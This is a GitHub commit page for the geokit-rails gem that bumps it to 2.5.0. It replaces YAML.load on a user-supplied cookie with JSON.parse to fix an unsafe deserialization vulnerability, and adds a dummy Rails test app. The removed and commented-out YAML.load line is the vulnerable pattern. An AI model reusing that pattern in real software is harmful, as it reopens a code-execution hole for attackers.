=== Content from github.com_7ed42bed_20250111_155817.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeokit%2Fgeokit-rails%2Fcommit%2F7ffc5813e57f6f417987043e1039925fd0865c43)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeokit%2Fgeokit-rails%2Fcommit%2F7ffc5813e57f6f417987043e1039925fd0865c43)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=geokit%2Fgeokit-rails)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[geokit](/geokit)
/
**[geokit-rails](/geokit/geokit-rails)**
Public

* [Notifications](/login?return_to=%2Fgeokit%2Fgeokit-rails) You must be signed in to change notification settings
* [Fork
  245](/login?return_to=%2Fgeokit%2Fgeokit-rails)
* [Star
   1.6k](/login?return_to=%2Fgeokit%2Fgeokit-rails)

* [Code](/geokit/geokit-rails)
* [Issues
  34](/geokit/geokit-rails/issues)
* [Pull requests
  4](/geokit/geokit-rails/pulls)
* [Actions](/geokit/geokit-rails/actions)
* [Projects
  0](/geokit/geokit-rails/projects)
* [Wiki](/geokit/geokit-rails/wiki)
* [Security](/geokit/geokit-rails/security)
* [Insights](/geokit/geokit-rails/pulse)

Additional navigation options

* [Code](/geokit/geokit-rails)
* [Issues](/geokit/geokit-rails/issues)
* [Pull requests](/geokit/geokit-rails/pulls)
* [Actions](/geokit/geokit-rails/actions)
* [Projects](/geokit/geokit-rails/projects)
* [Wiki](/geokit/geokit-rails/wiki)
* [Security](/geokit/geokit-rails/security)
* [Insights](/geokit/geokit-rails/pulse)

## Commit

[Permalink](/geokit/geokit-rails/commit/7ffc5813e57f6f417987043e1039925fd0865c43)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#159](https://github.com/geokit/geokit-rails/pull/159) from geokit/tests2023

[Browse files](/geokit/geokit-rails/tree/7ffc5813e57f6f417987043e1039925fd0865c43)
Browse the repository at this point in the history

```
Tests 2023
```

* Loading branch information

[![@ryankopf](https://avatars.githubusercontent.com/u/8394233?s=40&v=4)](/ryankopf)

[ryankopf](/geokit/geokit-rails/commits?author=ryankopf "View all commits by ryankopf")
authored
Jan 21, 2023

2 parents
[d1c2108](/geokit/geokit-rails/commit/d1c210832eb7d0ab7b931cba28f5f80a3ddbec33)
+
[a93dfe4](/geokit/geokit-rails/commit/a93dfe49fb9aeae7164e2f8c4041450a04b5482f)

commit 7ffc581

 Show file tree

 Hide file tree

Showing
**55 changed files**
with
**893 additions**
and
**95 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* CHANGELOG.md
  [CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed)
* geokit-rails.gemspec
  [geokit-rails.gemspec](#diff-351161f476a43f2466731fdb3feb32a4628c524b4be07dd94cc1a0ffa603d0bb)
* lib/geokit-rails

  + lib/geokit-rails/ip\_geocode\_lookup.rb
    [ip\_geocode\_lookup.rb](#diff-f1927bb9e8a09d70f938476227b3cfc2294383c5d6aa8debb7229d3eb3f4f278)
  + lib/geokit-rails/version.rb
    [version.rb](#diff-a2aa57cec1b9ba48dd775c49d5c7b45285c5e729a49320411a78fe3b728b61ac)
* test

  + dummy

    - test/dummy/Rakefile
      [Rakefile](#diff-128d579f540e340778f9670e403a75f9d6ac1d2821f4d1adae3883d21864aac8)
    - app

      * assets

        + images

          - test/dummy/app/assets/images/.keep
            [.keep](#diff-5e53a930caaff4743b38e511fc91aafdf40aeb3de4c57911f5d1c0d4023acb96)
        + stylesheets

          - test/dummy/app/assets/stylesheets/application.css
            [application.css](#diff-570c5d9486f0c9bb0220e1093e5d94730807ebc09d5cae37570f78b30daddbd7)
      * channels/application\_cable

        + test/dummy/app/channels/application\_cable/channel.rb
          [channel.rb](#diff-4acf452644dd3eb6420a196e479f40237b92c79ee03d40d086af4c7b58858c59)
        + test/dummy/app/channels/application\_cable/connection.rb
          [connection.rb](#diff-b51c37c7aa2f776517a921b7a13cf2816a2735ec0f1286a8ddb0a28f33832fc5)
      * controllers

        + test/dummy/app/controllers/application\_controller.rb
          [application\_controller.rb](#diff-eedaed27cc1eb474d2c935d0412c30a620403ed2525f7f60674d6b7ba18df5ce)
        + concerns

          - test/dummy/app/controllers/concerns/.keep
            [.keep](#diff-982e0e17bf00ce1d8cde91b62e5181f66e53f9dc23f412cf406213b4bcf36fd1)
        + test/dummy/app/controllers/location\_aware\_controller.rb
          [location\_aware\_controller.rb](#diff-bc9c204bb8ead89d66c04f0e467d2736ccede6bf3bf0f3e2ccdc870565a949e4)
      * helpers

        + test/dummy/app/helpers/application\_helper.rb
          [application\_helper.rb](#diff-cbc2b2e40da4bf113738398a95f08aec9fce657ec9c57e6883cba5e7592d51ec)
      * jobs

        + test/dummy/app/jobs/application\_job.rb
          [application\_job.rb](#diff-7dbf1b61a24b0392513479817d09c4d261a027fa52aef3625269bf9f48928539)
      * mailers

        + test/dummy/app/mailers/application\_mailer.rb
          [application\_mailer.rb](#diff-99b30dfe502b61ca5e78f2d8613bfda794428112c4b45c0daed9a6f79b9c17cf)
      * models

        + test/dummy/app/models/application\_record.rb
          [application\_record.rb](#diff-7890cc786792b15d979ff34c6ed4e71234c89675c6a5c6115e85538235b98bd1)
        + concerns

          - test/dummy/app/models/concerns/.keep
            [.keep](#diff-ec9a6383dfe6878d5ccbdd2e523cf7b26fface2720ce93e1e149af93303a8ced)
      * views/layouts

        + test/dummy/app/views/layouts/application.html.erb
          [application.html.erb](#diff-43c0412d37f1d3c86ead260125fae5c3c25333954d806e7482770f1bca33f25d)
        + test/dummy/app/views/layouts/mailer.html.erb
          [mailer.html.erb](#diff-eb79f7a4d3cda0e36c31bad5bf16e4456d261a7a886e0fa4936efa5907e6b9ef)
        + test/dummy/app/views/layouts/mailer.text.erb
          [mailer.text.erb](#diff-04fe2214d82a5cb12a3019bba07fe279e051fc2b9ead94d1b8caf20b064da04b)
    - bin

      * test/dummy/bin/rails
        [rails](#diff-80ac434eb26d2b3134a5aa70f01e1338ff2cb76f42a48b4518dc21119fc29c09)
      * test/dummy/bin/rake
        [rake](#diff-44ff725e1f2a61b1e4a751068df99d4f8e153ce889fc1c4019abb19e5f711957)
      * test/dummy/bin/setup
        [setup](#diff-bac6ab11cc6857b4927928d98bb3747494759ab822510ff814f870a679225854)
    - test/dummy/config.ru
      [config.ru](#diff-e772adc09d3e7104e6c138f735d09b4bc15bdae53054273a84ef97c4dbde984b)
    - config

      * test/dummy/config/application.rb
        [application.rb](#diff-205386a3cd43d6fbf2785ab0acf2293d8f79622baf8b3230e98146135bf49f1b)
      * test/dummy/config/boot.rb
        [boot.rb](#diff-93fa4ea71f3809aea9caac25971a8fa5c124817100c98b996ccf2fb3eaf9e0c3)
      * test/dummy/config/cable.yml
        [cable.yml](#diff-777ad19f5e0e5a9b3e939c319a47dc0cfe6d42a5bc4177aaf450db1840d651f8)
      * test/dummy/config/database.yml
        [database.yml](#diff-b1513ec38b9632b1e0ef23507fda6b20822c2b7d89198090b2ece290ebc4bbb2)
      * test/dummy/config/environment.rb
        [environment.rb](#diff-944d9c0a8ec37728892a31c68561f49da72c6977976df5b9895810354ab87c37)
      * environments

        + test/dummy/config/environments/development.rb
          [development.rb](#diff-8381d73e0802ca81482465d944159bee7fedeeb2512a774b3a05174828166a0f)
        + test/dummy/config/environments/production.rb
          [production.rb](#diff-def86dd6331d7c3a76ca08296b06496232ce391166d98d132ad5b9ae7ec5e0ce)
        + test/dummy/config/environments/test.rb
          [test.rb](#diff-0bbfee22122ce75fddd0af0b3010de607df5223f49bfc9a06cb47e54cc014389)
      * initializers

        + test/dummy/config/initializers/content\_security\_policy.rb
          [content\_security\_policy.rb](#diff-805dd895eb3cd63da506bc42cd77c8d8ab28efe09ccb420f5fd04ad2134b64c5)
        + test/dummy/config/initializers/filter\_parameter\_logging.rb
          [filter\_parameter\_logging.rb](#diff-73d20caa5ef84680dfb95542198cdda29be3804d15cd019f8161fcb3bbdc58a1)
        + test/dummy/config/initializers/inflections.rb
          [inflections.rb](#diff-ff24b089bf052778ab480556c32764d45b7f35af8ff460284b13a7f57aabb39b)
        + test/dummy/config/initializers/permissions\_policy.rb
          [permissions\_policy.rb](#diff-90ca4ede0a24342492c7ec4e8f7c0054d5f8b4b76ef67738a4feba0eebdb306d)
      * locales

        + test/dummy/config/locales/en.yml
          [en.yml](#diff-504b8eaee2804617cdb8f626995e5b2d6233a5708677594d2bd6f9ae3beedf35)
      * test/dummy/config/puma.rb
        [puma.rb](#diff-0a51dc2dc2be659f4b392bc1e1199f0525cca31b305554ec8c15225f6dc90245)
      * test/dummy/config/routes.rb
        [routes.rb](#diff-4db18ad9f6ffaeea4e9fe9438ad31417e958db030fb1f170ef9239e1e13a186b)
      * test/dummy/config/storage.yml
        [storage.yml](#diff-11309397d17c3bd5b59536bdab80853604b3d1809bfb08a7bb40d92cae93fcfb)
    - lib/assets

      * test/dummy/lib/assets/.keep
        [.keep](#diff-7ef1ed55681b96b03d98443cc1746f8194559b7de0d354595ada31aa704bc525)
    - log

      * test/dummy/log/.keep
        [.keep](#diff-3b2c7d7d40ed76b17c992726c105b3f7782e8ff5cc88e2620209e98d82a62f25)
    - public

      * test/dummy/public/404.html
        [404.html](#diff-056b225db6cad276aedb93b80b483586a214565cb47cc7721a9a35dfaac3c0f4)
      * test/dummy/public/422.html
        [422.html](#diff-a5d575b87bbeb1590256cf389b2402cd973fe701dd0458e20c2f8d1c6e87f821)
      * test/dummy/public/500.html
        [500.html](#diff-d30680d7f46496403e4eeef83f12131e470d1a4ffbb32588ba4c1c51126d42e6)
      * test/dummy/public/apple-touch-icon-precomposed.png
        [apple-touch-icon-precomposed.png](#diff-efbaaced372acb54197d42cc0722015058062af27da3a3496d846880fbe43145)
      * test/dummy/public/apple-touch-icon.png
        [apple-touch-icon.png](#diff-ee3b432a08772f3087405aecaa640318f104a602dfd0cba793a368749eb9606a)
      * test/dummy/public/favicon.ico
        [favicon.ico](#diff-a5d05ae38c05a792d65ac6841b444e044aeed3ac0b25a4b6023e649d8a14c482)
    - storage

      * test/dummy/storage/.keep
        [.keep](#diff-6b39a7b32e9e9f0a563b3f8948e3570acdd73b1cf202c9a4b42da84bab1ef86f)
    - tmp

      * test/dummy/tmp/.keep
        [.keep](#diff-a646d9a254da7c383c13223dcb0bd09b37a139b58e2b4db1e2bebe291faf5543)
      * pids

        + test/dummy/tmp/pids/.keep
          [.keep](#diff-b19036176a792449779a4b703150b88ebf76b354ee8518debc8e18a38a3bc849)
      * storage

        + test/dummy/tmp/storage/.keep
          [.keep](#diff-bc19816b7f21a52fda7abe4bdc06b81d72a6488fa25a8f60c8cf128b97e38ea0)
  + test/ip\_geocode\_lookup\_test.disabled.rb
    [ip\_geocode\_lookup\_test.disabled.rb](#diff-9425af478427131d7756b0922aa20d04509adb6594f95d9861deb5b286aed1b0)
  + test/ip\_geocode\_lookup\_test.rb
    [ip\_geocode\_lookup\_test.rb](#diff-015db9624cbf659ddf33ffb731b4758006ef01bc977fb4eede3079deaf2b9f7d)
  + test/test\_helper.rb
    [test\_helper.rb](#diff-ba37813ca277c227a74a372479b7b05b7f3ff085d890ab708f80d62573efdb7a)

## There are no files selected for viewing

5 changes: 5 additions & 0 deletions

5
[CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed "CHANGELOG.md")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/CHANGELOG.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,3 +1,8 @@ |
|  |  | ## 2.5.0 |
|  |  |  |
|  |  | \* Fixed dangerous YAML loading vulnerability |
|  |  | \* Rebuilt integration tests |
|  |  |  |
|  |  | ## 2.3.2 |
|  |  |  |
|  |  | \* Fix sqlite3 adapter error |
| Expand Down | |  |

11 changes: 6 additions & 5 deletions

11
[geokit-rails.gemspec](#diff-351161f476a43f2466731fdb3feb32a4628c524b4be07dd94cc1a0ffa603d0bb "geokit-rails.gemspec")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/geokit-rails.gemspec)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -20,14 +20,15 @@ Gem::Specification.new do |spec| |
|  |  | spec.add\_dependency 'rails', '>= 3.0' |
|  |  | spec.add\_dependency 'geokit', '~> 1.5' |
|  |  | spec.add\_development\_dependency "bundler", "> 1.0" |
|  |  | spec.add\_development\_dependency "simplecov", "~> 0.16.1" |
|  |  | spec.add\_development\_dependency "simplecov", ">= 0.16.1" |
|  |  | spec.add\_development\_dependency "simplecov-rcov" |
|  |  | spec.add\_development\_dependency 'net-http' |
|  |  | spec.add\_development\_dependency 'rake' |
|  |  | spec.add\_development\_dependency 'test-unit' |
|  |  | spec.add\_development\_dependency "mocha", "~> 0.9" |
|  |  | spec.add\_development\_dependency 'coveralls' |
|  |  | spec.add\_development\_dependency "mysql2", "~> 0.2" |
|  |  | spec.add\_development\_dependency "activerecord-mysql2spatial-adapter" |
|  |  | spec.add\_development\_dependency "pg", "~> 0.10" |
|  |  | spec.add\_development\_dependency 'coveralls\_reborn' |
|  |  | spec.add\_development\_dependency "mysql2", ">= 0.2" |
|  |  | # spec.add\_development\_dependency "activerecord-mysql2spatial-adapter" |
|  |  | spec.add\_development\_dependency "pg", ">= 0.10" |
|  |  | spec.add\_development\_dependency "sqlite3" |
|  |  | end |

11 changes: 4 additions & 7 deletions

11
[lib/geokit-rails/ip\_geocode\_lookup.rb](#diff-f1927bb9e8a09d70f938476227b3cfc2294383c5d6aa8debb7229d3eb3f4f278 "lib/geokit-rails/ip_geocode_lookup.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/lib/geokit-rails/ip_geocode_lookup.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,11 +12,7 @@ module IpGeocodeLookup |
|  |  | # Class method to mix into active record. |
|  |  | module ClassMethods # :nodoc: |
|  |  | def geocode\_ip\_address(filter\_options = {}) |
|  |  | if respond\_to? :before\_action |
|  |  | before\_action :store\_ip\_location, filter\_options |
|  |  | else |
|  |  | before\_filter :store\_ip\_location, filter\_options |
|  |  | end |
|  |  | before\_action :store\_ip\_location, filter\_options |
|  |  | end |
|  |  | end |
|  |  |  |
| Expand All | | @@ -28,13 +24,14 @@ def geocode\_ip\_address(filter\_options = {}) |
|  |  | # get the value. |
|  |  | def store\_ip\_location |
|  |  | session[:geo\_location] ||= retrieve\_location\_from\_cookie\_or\_service |
|  |  | cookies[:geo\_location] = { :value => session[:geo\_location].to\_yaml, :expires => 30.days.from\_now } if session[:geo\_location] |
|  |  | cookies[:geo\_location] = { :value => session[:geo\_location].to\_json, :expires => 30.days.from\_now } if session[:geo\_location] |
|  |  | end |
|  |  |  |
|  |  | # Uses the stored location value from the cookie if it exists. If |
|  |  | # no cookie exists, calls out to the web service to get the location. |
|  |  | def retrieve\_location\_from\_cookie\_or\_service |
|  |  | return GeoLoc.new(YAML.load(cookies[:geo\_location])) if cookies[:geo\_location] |
|  |  | # return GeoLoc.new(YAML.load(cookies[:geo\_location])) if cookies[:geo\_location] |
|  |  | return GeoLoc.new(JSON.parse(cookies[:geo\_location])) if cookies[:geo\_location] |
|  |  | location = Geocoders::MultiGeocoder.geocode(get\_ip\_address) |
|  |  | return location.success ? location : nil |
|  |  | end |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[lib/geokit-rails/version.rb](#diff-a2aa57cec1b9ba48dd775c49d5c7b45285c5e729a49320411a78fe3b728b61ac "lib/geokit-rails/version.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/lib/geokit-rails/version.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,3 +1,3 @@ |
|  |  | module GeokitRails |
|  |  | VERSION = "2.4.0.pre" |
|  |  | VERSION = "2.5.0" |
|  |  | end |

6 changes: 6 additions & 0 deletions

6
[test/dummy/Rakefile](#diff-128d579f540e340778f9670e403a75f9d6ac1d2821f4d1adae3883d21864aac8 "test/dummy/Rakefile")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/Rakefile)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | # Add your own tasks in files placed in lib/tasks ending in .rake, |
|  |  | # for example lib/tasks/capistrano.rake, and they will automatically be available to Rake. |
|  |  |  |
|  |  | require\_relative "config/application" |
|  |  |  |
|  |  | Rails.application.load\_tasks |

Empty file added
0

[test/dummy/app/assets/images/.keep](#diff-5e53a930caaff4743b38e511fc91aafdf40aeb3de4c57911f5d1c0d4023acb96 "test/dummy/app/assets/images/.keep")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/assets/images/.keep)
Edit file

Delete file

Empty file.

1 change: 1 addition & 0 deletions

1
[test/dummy/app/assets/stylesheets/application.css](#diff-570c5d9486f0c9bb0220e1093e5d94730807ebc09d5cae37570f78b30daddbd7 "test/dummy/app/assets/stylesheets/application.css")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/assets/stylesheets/application.css)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1 @@ |
|  |  | /\* Application styles \*/ |

4 changes: 4 additions & 0 deletions

4
[test/dummy/app/channels/application\_cable/channel.rb](#diff-4acf452644dd3eb6420a196e479f40237b92c79ee03d40d086af4c7b58858c59 "test/dummy/app/channels/application_cable/channel.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/channels/application_cable/channel.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,4 @@ |
|  |  | module ApplicationCable |
|  |  | class Channel < ActionCable::Channel::Base |
|  |  | end |
|  |  | end |

4 changes: 4 additions & 0 deletions

4
[test/dummy/app/channels/application\_cable/connection.rb](#diff-b51c37c7aa2f776517a921b7a13cf2816a2735ec0f1286a8ddb0a28f33832fc5 "test/dummy/app/channels/application_cable/connection.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/channels/application_cable/connection.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,4 @@ |
|  |  | module ApplicationCable |
|  |  | class Connection < ActionCable::Connection::Base |
|  |  | end |
|  |  | end |

3 changes: 3 additions & 0 deletions

3
[test/dummy/app/controllers/application\_controller.rb](#diff-eedaed27cc1eb474d2c935d0412c30a620403ed2525f7f60674d6b7ba18df5ce "test/dummy/app/controllers/application_controller.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/controllers/application_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,3 @@ |
|  |  | class ApplicationController < ActionController::Base |
|  |  | attr\_accessor :remote\_ip |
|  |  | end |

Empty file added
0

[test/dummy/app/controllers/concerns/.keep](#diff-982e0e17bf00ce1d8cde91b62e5181f66e53f9dc23f412cf406213b4bcf36fd1 "test/dummy/app/controllers/concerns/.keep")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/controllers/concerns/.keep)
Edit file

Delete file

Empty file.

43 changes: 43 additions & 0 deletions

43
[test/dummy/app/controllers/location\_aware\_controller.rb](#diff-bc9c204bb8ead89d66c04f0e467d2736ccede6bf3bf0f3e2ccdc870565a949e4 "test/dummy/app/controllers/location_aware_controller.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/controllers/location_aware_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,43 @@ |
|  |  | class LocationAwareController < ApplicationController #:nodoc: all |
|  |  | before\_action :set\_ip, only: [:index,:cookietest,:sessiontest] |
|  |  | before\_action :set\_ip\_bad, only: [:failtest] |
|  |  | before\_action :setup, only: [:cookietest,:sessiontest] |
|  |  | geocode\_ip\_address |
|  |  |  |
|  |  | def index |
|  |  | render plain: '' |
|  |  | end |
|  |  |  |
|  |  | def cookietest |
|  |  | cookies[:geo\_location] = @success.to\_json |
|  |  | render plain: '' |
|  |  | end |
|  |  |  |
|  |  | def sessiontest |
|  |  | session[:geo\_location] = @success.to\_json |
|  |  | render plain: '' |
|  |  | end |
|  |  |  |
|  |  | def failtest |
|  |  | render plain: '' |
|  |  | end |
|  |  |  |
|  |  | def rescue\_action(e) raise e end; |
|  |  | private |
|  |  | def set\_ip |
|  |  | request.remote\_ip = "good ip" |
|  |  | end |
|  |  | def set\_ip\_bad |
|  |  | request.remote\_ip = "bad ip" |
|  |  | end |
|  |  | def setup |
|  |  | @success = Geokit::GeoLoc.new |
|  |  | @success.provider = "hostip" |
|  |  | @success.lat = 41.7696 |
|  |  | @success.lng = -88.4588 |
|  |  | @success.city = "Sugar Grove" |
|  |  | @success.state = "IL" |
|  |  | @success.country\_code = "US" |
|  |  | @success.success = true |
|  |  | end |
|  |  | end |

2 changes: 2 additions & 0 deletions

2
[test/dummy/app/helpers/application\_helper.rb](#diff-cbc2b2e40da4bf113738398a95f08aec9fce657ec9c57e6883cba5e7592d51ec "test/dummy/app/helpers/application_helper.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/helpers/application_helper.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,2 @@ |
|  |  | module ApplicationHelper |
|  |  | end |

7 changes: 7 additions & 0 deletions

7
[test/dummy/app/jobs/application\_job.rb](#diff-7dbf1b61a24b0392513479817d09c4d261a027fa52aef3625269bf9f48928539 "test/dummy/app/jobs/application_job.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/jobs/application_job.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,7 @@ |
|  |  | class ApplicationJob < ActiveJob::Base |
|  |  | # Automatically retry jobs that encountered a deadlock |
|  |  | # retry\_on ActiveRecord::Deadlocked |
|  |  |  |
|  |  | # Most jobs are safe to ignore if the underlying records are no longer available |
|  |  | # discard\_on ActiveJob::DeserializationError |
|  |  | end |

4 changes: 4 additions & 0 deletions

4
[test/dummy/app/mailers/application\_mailer.rb](#diff-99b30dfe502b61ca5e78f2d8613bfda794428112c4b45c0daed9a6f79b9c17cf "test/dummy/app/mailers/application_mailer.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/mailers/application_mailer.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
